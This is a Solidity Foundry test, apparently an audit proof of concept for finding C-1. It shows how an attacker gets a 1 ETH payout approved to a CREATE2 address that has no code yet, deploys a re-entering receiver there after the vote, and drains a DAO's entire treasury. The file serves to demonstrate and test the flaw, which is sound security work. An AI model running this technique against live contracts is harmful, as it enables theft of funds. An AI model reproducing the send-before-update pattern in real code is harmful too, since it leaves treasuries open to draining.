// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {VotingDAOV2} from "contracts/VotingDAOV2.sol";

import {DAOTestBase} from "./Base.t.sol";

/// @notice Receives ETH from the DAO and re-enters `execute` while the treasury can pay again.
contract ReentrantETHReceiver {
    VotingDAOV2 private immutable dao;
    uint256 private immutable hash;
    uint256 private immutable amount;

    constructor(VotingDAOV2 dao_, uint256 hash_, uint256 amount_) {
        dao = dao_;
        hash = hash_;
        amount = amount_;
    }

    receive() external payable {
        if (address(dao).balance >= amount) dao.execute(hash);
    }
}

/// @notice Attacker-owned CREATE2 factory, used to deploy code at an address known in advance.
contract Create2Factory {
    function deploy(bytes32 salt, bytes memory initCode) external returns (address deployed) {
        assembly {
            deployed := create2(0, add(initCode, 0x20), mload(initCode), salt)
        }
        require(deployed != address(0), "CREATE2_FAILED");
    }
}

/// @title C-1. Reentrancy for withdrawing ETH
/// @notice `execute` sends ETH before it sets `proposal.isExecuted`, so the recipient can call
/// `execute` again for the same proposal and drain the treasury.
contract C1_ReentrancyWithdrawETH is DAOTestBase {
    uint256 internal constant HASH = 1;
    uint256 internal constant TREASURY = 10 ether;
    uint256 internal constant PAYOUT = 1 ether;

    function test_C1_ReentrancyWithdrawETH() public {
        vm.deal(address(dao), TREASURY);

        // 1. The attacker precomputes a CREATE2 address. It has no code yet, so it looks like an EOA.
        vm.prank(attacker);
        Create2Factory factory = new Create2Factory();
        bytes32 salt = keccak256("C1");
        bytes memory initCode = abi.encodePacked(type(ReentrantETHReceiver).creationCode, abi.encode(dao, HASH, PAYOUT));
        address recipient = vm.computeCreate2Address(salt, keccak256(initCode), address(factory));
        assertEq(recipient.code.length, 0);

        // 2. The attacker asks for a modest 1 ETH payment to that address, and the DAO accepts it.
        vm.prank(attacker);
        dao.withdrawETH(HASH, recipient, PAYOUT);
        _accept(HASH);

        // 3. After the vote, the attacker deploys the re-entering contract at the same address.
        vm.prank(attacker);
        factory.deploy(salt, initCode);
        assertGt(recipient.code.length, 0);

        // 4. A single execution of a 1 ETH proposal empties the whole treasury.
        vm.prank(attacker);
        dao.execute(HASH);

        assertEq(recipient.balance, TREASURY, "recipient received the whole treasury");
        assertEq(address(dao).balance, 0, "treasury is empty");
    }
}
